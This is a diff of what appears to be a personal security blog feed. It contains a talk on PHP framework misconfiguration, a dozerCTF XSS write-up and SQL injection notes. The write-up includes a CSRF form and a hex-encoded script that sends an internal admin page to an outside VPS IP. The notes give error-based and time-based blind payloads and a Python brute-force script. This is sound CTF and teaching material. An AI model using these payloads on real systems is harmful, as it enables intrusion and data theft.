+    <content><![CDATA[<h1 id="php框架入门"><a href="#php框架入门" class="headerlink" title="php框架入门"></a>php框架入门</h1><p>因为是安全相关，主要是讲解一下:</p>
+<ol>
+<li>一个框架中有那些重要的文件和文件夹</li>
+<li>运维的粗心会导致哪些问题</li>
+<li>框架的类加载机制</li>
+</ol>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我于2020.11.8的例会分享内容，如有错误还请指正！</p>
+<h1 id="先从文件和文件夹讲起"><a href="#先从文件和文件夹讲起" class="headerlink" title="先从文件和文件夹讲起"></a>先从文件和文件夹讲起</h1><p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8sFx" alt="thinkphp"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi86fK" alt="laravel"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8BwR" alt="yii2"></p>
+<h2 id="public-web目录"><a href="#public-web目录" class="headerlink" title="public/web目录"></a>public/web目录</h2><p>我们先康康不同框架中，public/web文件夹里面有什么东西。</p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8gSO" alt="thinkphp-public"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8DT1" alt="laravel-public"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8WOH" alt="yii-web"></p>
+<p>可以看道三个文件夹共有的特征便是——都拥有<code>index.php</code>文件。文件内容都大致如以下伪代码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;...&quot;, &quot;...&quot;);</span><br><span class="line">&#x2F;&#x2F;...  &#x2F;&#x2F; 定义了一些常量，例如yii是定义其debug是否开启等...</span><br><span class="line"></span><br><span class="line">require __DIR__.&#39;&#x2F;..&#x2F;vendor&#x2F;autoload.php&#39;;</span><br><span class="line">&#x2F;&#x2F; 导入autoload.php来自动加载类，这个之后在讲</span><br><span class="line"></span><br><span class="line">$config &#x3D; require &#39;..&#x2F;config&#x2F;config.php&#39;;</span><br><span class="line">require ...;</span><br><span class="line">&#x2F;&#x2F; 导入一些其它文件，比如config，引导文件等...</span><br><span class="line"></span><br><span class="line">(new app($config))-&gt;run();</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">$http &#x3D; (new App())-&gt;http;</span><br><span class="line">$response &#x3D; $http-&gt;run();</span><br><span class="line">$response-&gt;send();</span><br><span class="line">$http-&gt;end($response);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; 启动框架</span><br></pre></td></tr></table></figure>
+
+<p>可见<code>index.php</code>便是整个框架的入口文件了。那么public/web文件夹应该是被作为网站根目录来使用的。</p>
+<p>对于渗透人员来说，如果运维人员配置错误，会发生什么？例如以下场景。</p>
+<p>Q: 有时候我们会发现，一个网站的主页并不是<a href="http://vps.com/，而是http://vps.com/public/，甚至是http://vps.ip/app/public/时，这说明了什么？">http://vps.com/，而是http://vps.com/public/，甚至是http://vps.ip/app/public/时，这说明了什么？</a></p>
+<p>A: 很明显，懒狗并没有按照框架的要求将public/web目录设置为网站主目录。这里分开讨论：</p>
+<ol>
+<li>对于<a href="http://vps.com/public/的情况，运维应该是将框架目录设为了网站主目录，这种情况下，我们就可以根据不同的文件夹去读取在public/web下读不到的东西。">http://vps.com/public/的情况，运维应该是将框架目录设为了网站主目录，这种情况下，我们就可以根据不同的文件夹去读取在public/web下读不到的东西。</a></li>
+<li>对于<a href="http://vps.ip/app1/public/的情况，那就是大奖了。很有可能是以下情况：">http://vps.ip/app1/public/的情况，那就是大奖了。很有可能是以下情况：</a></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var--www--app1</span><br><span class="line">         -app2</span><br><span class="line">         -app3</span><br><span class="line">         -...</span><br><span class="line">         -index.php</span><br></pre></td></tr></table></figure>
+
+<p>在这个服务器上存在多个网站，但运维懒狗到懒到不想为每个目录独立配置服务器，设置了更上一层的目录为网站根目录，还“贴心”设置了<code>index.php</code>引导用户跳转到不同文件夹下的不同目录。对于这种设置，我们就可以读到更多原来读不到的文件。</p>
+<p>对于其它的public/web下的其它文件，就说一下yii2下的<code>web/assets</code>文件夹吧。根据官网文档，这个文件夹的作用是如下：</p>
+<p>如果资源包放在 Web 不能访问的目录， 当视图注册资源时资源会被拷贝到一个 Web 可访问的目录中， 这个过程称为<em>资源发布</em>。资源包即为那些<code>css/js</code>文件。php将会在assets创建一个资源包文件的链接。</p>
+<p>这个功能是默认开启的，但当<code>assets</code>没有www-data的写权限时，<code>yii</code>会爆出无法写入文件的错误，解决途径有两个，一是关闭资源发布，二是给其写权限。如果是没有经验的运维，会老老实实根据<code>yii</code>爆出的错误，给予该文件夹写权限。那么如果有任意目录的文件上传，你知道该上传到哪里了吧？</p>
+<h2 id="vendor目录"><a href="#vendor目录" class="headerlink" title="vendor目录"></a>vendor目录</h2><p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi82lD" alt="thinkphp-vendor"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8yY6" alt="laravel-vendor"></p>
+<p><img src="E:%5Cblog%5Cblog-githubPage%5Cblog%5Csource_posts%5CDi8R6e" alt="yii-vendor"></p>
+<p>这个目录里装载了一个框架所需的依赖包，如果开发需要一些包作为辅助时，也会安装到这个文件夹。</p>
+<p>这里不得不谈的是php的类加载机制。</p>
+<h3 id="autoload-php文件"><a href="#autoload-php文件" class="headerlink" title="autoload.php文件"></a>autoload.php文件</h3><p>在入口文件中，我们看到，其导入了<code>vendor/autoload.php</code>文件，而其又导入了<code>composer/autoload_real.php</code>文件。我们来看看<code>autoload_real.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// autoload_real.php @generated by Composer</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 加载器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $loader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载加载器文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadClassLoader</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'Composer\Autoload\ClassLoader'</span> === $class) &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/ClassLoader.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取加载器</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Composer\Autoload\ClassLoader</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLoader</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 单例模式</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> !== <span class="keyword">self</span>::$loader) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$loader;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 平台检查</span></span><br><span class="line">        <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/platform_check.php'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法获取加载器</span></span><br><span class="line">        spl_autoload_register(<span class="keyword">array</span>(<span class="string">'ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca'</span>, <span class="string">'loadClassLoader'</span>), <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">self</span>::$loader = $loader = <span class="keyword">new</span> \Composer\Autoload\ClassLoader();</span><br><span class="line">        spl_autoload_unregister(<span class="keyword">array</span>(<span class="string">'ComposerAutoloaderInite66911f1406e2749477b48d048bd8aca'</span>, <span class="string">'loadClassLoader'</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当符合以下条件，就使用静态初始化，否则使用接口初始化</span></span><br><span class="line">        $useStaticLoader = PHP_VERSION_ID &gt;= <span class="number">50600</span> &amp;&amp; !defined(<span class="string">'HHVM_VERSION'</span>) &amp;&amp; (!function_exists(<span class="string">'zend_loader_file_encoded'</span>) || !zend_loader_file_encoded());</span><br><span class="line">        <span class="keyword">if</span> ($useStaticLoader) &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_static.php'</span>;</span><br><span class="line">            </span><br><span class="line">            call_user_func(</span><br><span class="line">                \Composer\Autoload\ComposerStaticInite66911f1406e2749477b48d048bd8aca::getInitializer($loader)</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_namespaces.php'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">                $loader-&gt;set($namespace, $path);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $map = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_psr4.php'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($map <span class="keyword">as</span> $namespace =&gt; $path) &#123;</span><br><span class="line">                $loader-&gt;setPsr4($namespace, $path);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $classMap = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_classmap.php'</span>;</span><br><span class="line">            <span class="keyword">if</span> ($classMap) &#123;</span><br><span class="line">                $loader-&gt;addClassMap($classMap);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对加载器进行注册</span></span><br><span class="line">        <span class="comment">// 其内部的大致流程是: classMap-&gt;psr-4-&gt;psr-0</span></span><br><span class="line">        $loader-&gt;register(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对辅助函数类直接进行加载</span></span><br><span class="line">        <span class="keyword">if</span> ($useStaticLoader) &#123;</span><br><span class="line">            $includeFiles = Composer\Autoload\ComposerStaticInite66911f1406e2749477b48d048bd8aca::$files;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $includeFiles = <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/autoload_files.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($includeFiles <span class="keyword">as</span> $fileIdentifier =&gt; $file) &#123;</span><br><span class="line">            <span class="comment">// 直接加载</span></span><br><span class="line">            composerRequiree66911f1406e2749477b48d048bd8aca($fileIdentifier, $file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回加载器</span></span><br><span class="line">        <span class="keyword">return</span> $loader;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">composerRequiree66911f1406e2749477b48d048bd8aca</span><span class="params">($fileIdentifier, $file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($GLOBALS[<span class="string">'__composer_autoload_files'</span>][$fileIdentifier])) &#123;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line"></span><br><span class="line">        $GLOBALS[<span class="string">'__composer_autoload_files'</span>][$fileIdentifier] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，php的自动类加载遵循了psr-4规范。</p>
+<p>对于java来说，当一个文件存在多个类时，会自动将多出来的类放入新的class文件内，而不是两个类共存同一个文件。而php的标准对于这个就无能为力了。</p>
+<p>在WMCTF2020中有一道webweb的反序列化链便存在这个问题。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ws.php // Agent.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 危险代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题使用<code>fatfree</code>框架，我们的起点<code>__destruct</code>在<code>CLI\Agent</code>下，但此类和<code>CLI\WS</code>共存在<code>ws.php</code>上，根据上面的加载规则，<code>Agent</code>类是加载不到的。</p>
+<p>这是这个题的一个坑点，如果我们想要加载这个类，就要提前去导入<code>ws.php</code>。做法也简单，在整个<code>payload</code>外层包裹一层<code>CLI\WS</code>即可。这样，类加载器会根据最外层的<code>CLI\WS</code>一类，首先导入<code>ws.php</code>，然后解析器会同时解析<code>CLI\WS</code>和<code>CLI\Agent</code>，再导入<code>CLI\Agent</code>类时，就成功了。</p>
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>还有一些零散的文件可以注意一下，这里简单进行一个概况</p>
+<p>如果出现了在上面public文件夹出现的问题可以注意一下:</p>
+<ol>
+<li>.env 系统环境变量，可能会有数据库地址和密码，以及类似于laravel中的密钥</li>
+<li>README.md 获得框架名称、版本，以便对框架进行代码审计</li>
+<li>composer.lock 获得当前框架所有依赖名</li>
+</ol>
+<p>如果当前目录下有<code>assets</code>文件夹，大概率是<code>yii2</code>框架</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>感谢懒狗运维\开发给我们饭恰(bushi)</p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+        <tag>框架</tag>
+        <tag>代码审计</tag>
+      </tags>
   </entry>
   <entry>
     <title>不完整的Hgame2020-CTF的WP</title>
@@ -1304,7 +1221,7 @@ $.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&
 //stamp为
 let stamp = md5(Date.parse(new Date()) / 1000); </code></pre><p>在分析完代码后，我们便可以修改js源码，伪造数据，获得flag</p>
 <pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><h3 id="考察点-4"><a href="#考察点-4" class="headerlink" title="考察点"></a>考察点</h3><p>逻辑漏洞<br>一些php的函数缺陷</p>
-<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><p>在最开始可以得到一个登录页面。随即可以发现url疑似可以进行文件包含。<br><a href="http://cosmos-admin.hgame.day-day.work/index.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php</a><strong>?action=login.php</strong><br>将<code>login.php</code>替换为根目录下的<code>/flag</code>返回了<code>Hacker get out</code>应该是被过滤了。<br>尝试用php伪协议中的<code>php://filter/read</code>来进行php源码的读取。<br>得到<code>login.php</code>和<code>index.php</code>的源码。在<code>login.php</code>源码里顺藤摸瓜得到了<code>admin.php</code>文件源码。在其中还知道了一个<code>config.php</code>文件，但被过滤了，无法读取。<br>PS：方便起见这里只展示php源码。</p>
+<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><p>在最开始可以得到一个登录页面。随即可以发现url疑似可以进行文件包含。<br><a href="http://cosmos-admin.hgame.day-day.work/index.php">http://cosmos-admin.hgame.day-day.work/index.php</a><strong>?action=login.php</strong><br>将<code>login.php</code>替换为根目录下的<code>/flag</code>返回了<code>Hacker get out</code>应该是被过滤了。<br>尝试用php伪协议中的<code>php://filter/read</code>来进行php源码的读取。<br>得到<code>login.php</code>和<code>index.php</code>的源码。在<code>login.php</code>源码里顺藤摸瓜得到了<code>admin.php</code>文件源码。在其中还知道了一个<code>config.php</code>文件，但被过滤了，无法读取。<br>PS：方便起见这里只展示php源码。</p>
 <p><strong>login.php</strong></p>
 <pre><code>&lt;?php
 include &quot;config.php&quot;;
@@ -1621,6 +1538,226 @@ pool.join()</code></pre><p>得到token：<code>f802788a02a51f9c624bb5d91815b</co
 <pre><code>hgame{xsS_1s_r3a11y_inTeresT1ng!!}</code></pre>]]></content>
   </entry>
   <entry>
+    <title>dozerCTF - Fake phpminiadmin</title>
+    <url>/2020/06/17/dozerCTF-Fake-phpminiadmin/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie</p>
+<h1 id="Fake-phpminiadmin"><a href="#Fake-phpminiadmin" class="headerlink" title="Fake phpminiadmin"></a>Fake phpminiadmin</h1><p>这道题开始给了一个页面可以执行sql语句。刚开始以为是sql注入之类的，但实际上在上面的一栏中有contact选项。明显是一道和xss有关的题了。</p>
+<h2 id="可以xss的点"><a href="#可以xss的点" class="headerlink" title="可以xss的点"></a>可以xss的点</h2><p>那么首先要找到可以xss的点，尝试在输出sql语句输出的地方插入js语句，发现<code>&lt;&gt;</code>尖括号被过滤了，证明这个地方有鬼。</p>
+<pre><code># 尝试以下语句，被阻拦
+select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
+# 尝试hex绕过，成功弹窗
+select 0x3C7363726970743E616C6572742831293C2F7363726970743E;</code></pre><p>接下来便是该想办法怎么样让机器人执行这里的sql。这里的sql数据使用了post，无法直接将带有弹窗数据的url直接发给机器人。<br>这里我想了两种方法：</p>
+<ol>
+<li>利用iframe+xss截图实现。</li>
+<li>利用CSRF进行跳转。</li>
+</ol>
+<p>首先一是不行的，进行测验，iframe只会在加载完js之后才会进行加载。导致无论如何利用js截图，都只能截到一个白框。<br>看起来只能跳转了。</p>
+<h2 id="利用CSRF进行跳转"><a href="#利用CSRF进行跳转" class="headerlink" title="利用CSRF进行跳转"></a>利用CSRF进行跳转</h2><p>首先机器人是不会对网址进行验证的，故我们可以在自己的vps上安置一个CSRF来对进行一个跳转。<br>不过，在当时我先是利用xss平台来确认一下机器人的cookie什么的，发现机器人的session没有特殊信息，但referrer给了一个特殊的网址：<code>http://127.0.0.1/admin_shark.php</code>,看起来这个内网的连接有东西。这更加证明了我们需要csrf来进行跳转，否则同源策略会阻挡我们获取这个内网连接的源码。<br>这里有一个点，便是admin_shark.php在外网下也可以访问，只不过会被拦截，提示你需要在内网访问。这代表着这个内网的服务器和公网的服务器是同一个（或者是是相同的）<br>数据被放置在了 <code>https://www.afkl.ml/xss.php</code>现在应该还能看到。在当时被安放了这么一组数据：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt;
+  &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  var f = document.getElementById(&quot;sql&quot;);
+  f.submit();
+&lt;/script&gt;
+&lt;h1&gt;it works!&lt;/h1&gt; </code></pre><p>本质是是构建了一个表单，下面的js会令其强制POST表单内容(PS:foxfire会弹窗询问是否提交表单，但chrome不会)<br>其中hex后的内容是</p>
+<pre><code>&lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt;
+(上面是我的测试vps)</code></pre><p>在测试vps上开启监听，提交url，静候佳音即可。</p>
+<pre><code>flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}</code></pre><p>PS:可惜当时没有知道beef-xss，知道了这道题就有趣多了（</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SQL注入笔记</title>
+    <url>/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！</p>
+<p>[TOC]</p>
+<h2 id="普通注入-amp-amp-基础命令"><a href="#普通注入-amp-amp-基础命令" class="headerlink" title="普通注入&amp;&amp;基础命令"></a>普通注入&amp;&amp;基础命令</h2><h3 id="常用查库、表指令"><a href="#常用查库、表指令" class="headerlink" title="常用查库、表指令"></a>常用查库、表指令</h3><pre><code>查库： select schema_name from information_schema.schemata &lt;==&gt; show databases
+
+查表：select table_name from information_schema.tables where table_schema=0x7365637572697479(库名)    //&apos;security&apos;
+
+查列：select column_name from information_schema.columns where table_name=&apos;~~~~&apos;;    //column 列；栏
+
+查字段：select (column1),(column2) from (表名).(列名);</code></pre><p>其中schema_name;table_name;column_name…可视为一种全局变量;</p>
+<h3 id="concat-函数、ordor-by"><a href="#concat-函数、ordor-by" class="headerlink" title="concat()函数、ordor by"></a>concat()函数、ordor by</h3><p>有时查列或表一次性无法显示全，就用group_concat()包住上列全局变量;<br>group_concat()的作用是将所有数据拼接为1行显示，详细可查看concat函数介绍;</p>
+<p>order by指令原本用于排序，但在注入中可以用于确定列数；<br>假定某表有3列；</p>
+<pre><code>/?id=1&apos; order by 1;--&gt;成功
+/?id=1&apos; order by 2;--&gt;成功
+/?id=1&apos; order by 3;--&gt;成功
+/?id=1&apos; order by 4;--&gt;失败</code></pre><p>故此表有三列;<br>limit (起始序号(0开始)),(展示行数);<br>待补充…</p>
+<h3 id="不常用全局变量"><a href="#不常用全局变量" class="headerlink" title="不常用全局变量"></a>不常用全局变量</h3><pre><code>select system_user()&lt;==&gt;user()    //展示系统用户
+
+select database()            //展示数据库名
+
+select version()            //展示版本信息
+
+select @@datadir            //展示数据储存路径
+
+select @@version_compile_os    //展示服务器系统</code></pre><h3 id="为什么会有1-2-select…"><a href="#为什么会有1-2-select…" class="headerlink" title="为什么会有1,2,select…"></a>为什么会有1,2,select…</h3><p>类似于（union selcet 1,2,<del>#）的缘故:<br>上例是确定了此表有三列，为想要的数据得到展示，选择第三列来显示;<br>当如（union 1,selcet ~</del>,3#）时数据会出现在第二列;</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="XPath语法错误注入"><a href="#XPath语法错误注入" class="headerlink" title="XPath语法错误注入"></a>XPath语法错误注入</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串。<br>当我们在XPath_string故意填入错误的XPath时，在回显报错的同时会执行XPath的sql语句。<br>可根据此函数进行报错注入</p>
+<pre><code>// 这里是为了绕过空格的检测，所以用()把所有的东西包裹起来
+// 0x7e是“~”，是sql的一元运算符，可以防止在回显的时候不回显第一组数据
+// 可以的话想用0x5e“^”也可以...
+extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))#
+extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#</code></pre><h4 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML()"></a>UPDATEXML()</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>和上面同理，但需要多加一个NULL</p>
+<h3 id="整型溢出错误注入（SQL-lt-5-5-53）"><a href="#整型溢出错误注入（SQL-lt-5-5-53）" class="headerlink" title="整型溢出错误注入（SQL&lt;5.5.53）"></a>整型溢出错误注入（SQL&lt;5.5.53）</h3><pre><code>select ~0;
+&gt;&gt;&gt; 18446744073709551615</code></pre><p>这里我们对0进行了取反，导致数据溢出</p>
+<pre><code>select !(select * from (select user())x);
+&gt;&gt;&gt; 1</code></pre><p>当一条语句执行成功时，返回0。因此非一下就变成了“1”.</p>
+<pre><code>select exp(710);
+&gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</code></pre><p>这里exp()计算自然指数。到了710就已经溢出了，我们尝试：</p>
+<pre><code>select exp(~(select*from(select user())x));
+&gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</code></pre><p>虽然报错，但成功返回用户信息。以此来注入。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>在时间盲注中共使用了4个比较重要的语句：</p>
+<pre><code>sleep(s);         # 将语句延迟s秒
+if(a,b,c);         # 如果a语句成立，执行b，否则执行c
+ascii(a);        # 将语句a的字符转换为ascii(十进制)
+substr(a,b,c);    # 将a的语句，从b(num)的位置开始，截取c(num)个字符</code></pre><p>我们将其一个一个结合起来就可以得到：</p>
+<pre><code>select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1);
+# 一一拆分对应
+select if(@a,sleep(5),1)     #如果@a语句成立，执行sleep(5)，否则返回1
+@a=(ascii(@b)=?)            #判断ascii后的@b是否等于?中的数字
+@b=substr(@c,?,1)            #从?处开始，截取@c语句中的1个字符
+@c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database())     #查表语句，可以变换为查列，查字段的语句</code></pre><p>由此，我们可以实现爆破来获得信息<br>这里来一个python脚本(版本&gt;3.0)（十分臃肿</p>
+<pre><code>import requests
+
+mode = input(&quot;plz input use mode:&quot;)
+# T查表 C查列 F查字段
+while(True):
+    if(mode == &apos;T&apos;):
+        payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;C&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos;
+        break
+
+    elif(mode == &apos;F&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        col = input(&apos;plz input col_name:&apos;)
+        payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos;
+        break
+
+    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
+        print(&apos;Error&apos;)
+
+url = &apos;http://114514.com/FAQ.php&apos;
+res = &apos;&apos;
+sel_num = input(&quot;plz input sel_num:&quot;)
+# 要查询的字符数
+
+for i in range(1,sel_num):
+    print(i)
+    for j in range(32,127):
+        print(chr(j))
+        now_payload = payload % (i,j)
+        try:
+            r = requests.post(url=url,data=now_payload,timeout=4.5)
+            # 这里视情况更改
+        except:
+            res += chr(j)
+print(res)</code></pre><h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一定条件下，我们可以通过 “ ; ” 提前结束sql语句，并在后面跟上其它sql语句，得到执行。在myphpadmin我们便可以这样多句执行<br>比如：</p>
+<pre><code>$a = $_GET[&apos;a&apos;];
+$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;</code></pre><p>在这里我们甚至可以构造：</p>
